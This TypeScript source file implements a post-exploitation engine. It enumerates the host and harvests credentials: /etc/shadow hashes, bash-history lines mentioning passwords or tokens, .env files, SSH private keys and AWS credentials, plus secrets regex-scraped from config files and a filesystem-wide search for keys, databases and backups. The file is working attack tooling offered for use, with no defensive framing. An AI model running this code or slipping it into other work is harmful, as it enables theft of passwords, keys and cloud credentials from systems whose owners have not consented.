/**
 * Live Post-Exploitation Engine
 * Real local enumeration, credential harvesting, and data staging.
 * Runs on the current host (local execution) or via shell session.
 */

import { execFile } from 'node:child_process'
import { promisify } from 'node:util'
import * as fs from 'node:fs'
import * as path from 'node:path'

const execFileP = promisify(execFile)

export interface PostExFinding {
  category: 'credential' | 'sensitive_file' | 'user_info' | 'network_info' | 'process_info' | 'persistence'
  severity: 'critical' | 'high' | 'medium' | 'low'
  name: string
  value: string
  path?: string
}

export class LivePostExEngine {
  async enumerateSystem(): Promise<PostExFinding[]> {
    const findings: PostExFinding[] = []
    try {
      const idR = await execFileP('id', [], { timeout: 3000 })
      findings.push({ category: 'user_info', severity: 'low', name: 'Current user', value: idR.stdout.trim() })
    } catch { /* ignore */ }
    try {
      const whoR = await execFileP('whoami', [], { timeout: 3000 })
      const hostnR = await execFileP('hostname', [], { timeout: 3000 })
      findings.push({ category: 'user_info', severity: 'low', name: 'Identity', value: `${whoR.stdout.trim()}@${hostnR.stdout.trim()}` })
    } catch { /* ignore */ }
    try {
      const unameR = await execFileP('uname', ['-a'], { timeout: 3000 })
      findings.push({ category: 'user_info', severity: 'low', name: 'OS', value: unameR.stdout.trim() })
    } catch { /* ignore */ }
    try {
      const ipR = await execFileP('ip', ['addr', 'show'], { timeout: 5000 }).catch(() => execFileP('ifconfig', ['-a'], { timeout: 5000 }))
      findings.push({ category: 'network_info', severity: 'low', name: 'Network interfaces', value: ipR.stdout.slice(0, 1000) })
    } catch { /* ignore */ }
    try {
      const arpR = await execFileP('arp', ['-n'], { timeout: 5000 }).catch(() => ({ stdout: '' }))
      if (arpR.stdout.includes('.')) {
        findings.push({ category: 'network_info', severity: 'medium', name: 'ARP table (nearby hosts)', value: arpR.stdout.slice(0, 500) })
      }
    } catch { /* ignore */ }
    try {
      const psR = await execFileP('ps', ['aux'], { timeout: 5000 })
      findings.push({ category: 'process_info', severity: 'low', name: 'Running processes', value: psR.stdout.slice(0, 2000) })
    } catch { /* ignore */ }
    return findings
  }

  async harvestCredentials(): Promise<PostExFinding[]> {
    const findings: PostExFinding[] = []
    try {
      const shadow = fs.readFileSync('/etc/shadow', 'utf-8')
      const lines = shadow.split('\n').filter(l => l.includes(':$'))
      if (lines.length > 0) {
        findings.push({ category: 'credential', severity: 'critical', name: '/etc/shadow hashes', value: lines.join('\n').slice(0, 1000), path: '/etc/shadow' })
      }
    } catch { /* ignore */ }
    try {
      const passwd = fs.readFileSync('/etc/passwd', 'utf-8')
      const users = passwd.split('\n').filter(l => l.includes('/bin/bash') || l.includes('/bin/sh'))
      findings.push({ category: 'user_info', severity: 'medium', name: 'Shell users in /etc/passwd', value: users.join('\n'), path: '/etc/passwd' })
    } catch { /* ignore */ }
    const historyFiles = ['/root/.bash_history', `${process.env.HOME || '/home'}/.bash_history`]
    for (const hf of historyFiles) {
      try {
        const hist = fs.readFileSync(hf, 'utf-8')
        const credLines = hist.split('\n').filter(l => /password|passwd|pass|secret|token|key|cred/i.test(l))
        if (credLines.length > 0) {
          findings.push({ category: 'credential', severity: 'high', name: `Credentials in ${hf}`, value: credLines.slice(0, 10).join('\n'), path: hf })
        }
      } catch { /* ignore */ }
    }
    const envPaths = ['.env', '../.env', '../../.env', '/var/www/.env', '/opt/.env', '/srv/.env']
    for (const ep of envPaths) {
      try {
        const env = fs.readFileSync(ep, 'utf-8')
        findings.push({ category: 'credential', severity: 'critical', name: `.env file: ${ep}`, value: env.slice(0, 500), path: ep })
      } catch { /* ignore */ }
    }
    const sshDirs = ['/root/.ssh', `${process.env.HOME || '/home'}/.ssh`]
    for (const sshDir of sshDirs) {
      try {
        const files = fs.readdirSync(sshDir)
        for (const file of files) {
          if (file.startsWith('id_') && !file.endsWith('.pub')) {
            const keyPath = path.join(sshDir, file)
            const key = fs.readFileSync(keyPath, 'utf-8')
            findings.push({ category: 'credential', severity: 'critical', name: `SSH private key: ${keyPath}`, value: key.slice(0, 200) + '...', path: keyPath })
          }
        }
      } catch { /* ignore */ }
    }
    const awsCredFile = `${process.env.HOME || '/root'}/.aws/credentials`
    try {
      const awsCreds = fs.readFileSync(awsCredFile, 'utf-8')
      findings.push({ category: 'credential', severity: 'critical', name: 'AWS credentials', value: awsCreds.slice(0, 300), path: awsCredFile })
    } catch { /* ignore */ }
    const configPatterns = [
      { pattern: /password\s*=\s*['"]?([^'"\n]{4,})/i, name: 'password' },
      { pattern: /secret\s*=\s*['"]?([^'"\n]{4,})/i, name: 'secret' },
      { pattern: /api[_-]?key\s*=\s*['"]?([^'"\n]{8,})/i, name: 'api_key' },
      { pattern: /token\s*=\s*['"]?([^'"\n]{8,})/i, name: 'token' },
    ]
    const searchDirs = ['/etc', '/opt', '/var/www', '/srv', process.cwd()]
    for (const dir of searchDirs) {
      try {
        const files = fs.readdirSync(dir).filter(f => f.endsWith('.conf') || f.endsWith('.ini') || f.endsWith('.cfg') || f.endsWith('.yaml') || f.endsWith('.yml') || f === '.env')
        for (const file of files.slice(0, 5)) {
          try {
            const content = fs.readFileSync(path.join(dir, file), 'utf-8')
            for (const { pattern, name } of configPatterns) {
              const m = content.match(pattern)
              if (m && m[1]) {
                findings.push({ category: 'credential', severity: 'high', name: `${name} in ${dir}/${file}`, value: `${name}=${m[1]}`, path: path.join(dir, file) })
              }
            }
          } catch { /* ignore */ }
        }
      } catch { /* ignore */ }
    }
    return findings
  }

  async findSensitiveFiles(): Promise<PostExFinding[]> {
    const findings: PostExFinding[] = []
    const sensitivePatterns = [
      '*.pem', '*.key', '*.p12', '*.pfx', '*.cer',
      'id_rsa', 'id_dsa', 'id_ecdsa', 'id_ed25519',
      '*.sql', '*.db', '*.sqlite', '*.sqlite3',
      'backup*.tar*', 'backup*.zip', '*.bak',
      'wp-config.php', 'config.php', 'database.yml',
    ]
    for (const pattern of sensitivePatterns.slice(0, 5)) {
      try {
        const result = await execFileP('find', ['/', '-name', pattern, '-readable', '-size', '-50M', '-not', '-path', '*/proc/*', '-not', '-path', '*/sys/*'], { timeout: 15000 }).catch((e: unknown) => ({ stdout: (e as {stdout?: string}).stdout || '' }))
        const files = result.stdout.split('\n').filter(Boolean).slice(0, 10)
        for (const f of files) {
          findings.push({ category: 'sensitive_file', severity: 'high', name: `Sensitive file: ${f}`, value: f, path: f })
        }
      } catch { /* ignore */ }
    }
    return findings
  }

  async runFullPostEx(): Promise<{ findings: PostExFinding[]; summary: string }> {
    const [sys, creds, sensitive] = await Promise.all([
      this.enumerateSystem().catch(() => [] as PostExFinding[]),
      this.harvestCredentials().catch(() => [] as PostExFinding[]),
      this.findSensitiveFiles().catch(() => [] as PostExFinding[]),
    ])
    const all = [...sys, ...creds, ...sensitive]
    const critCount = all.filter(f => f.severity === 'critical').length
    return {
      findings: all,
      summary: `Post-exploitation: ${all.length} findings (${critCount} critical)`,
    }
  }
}
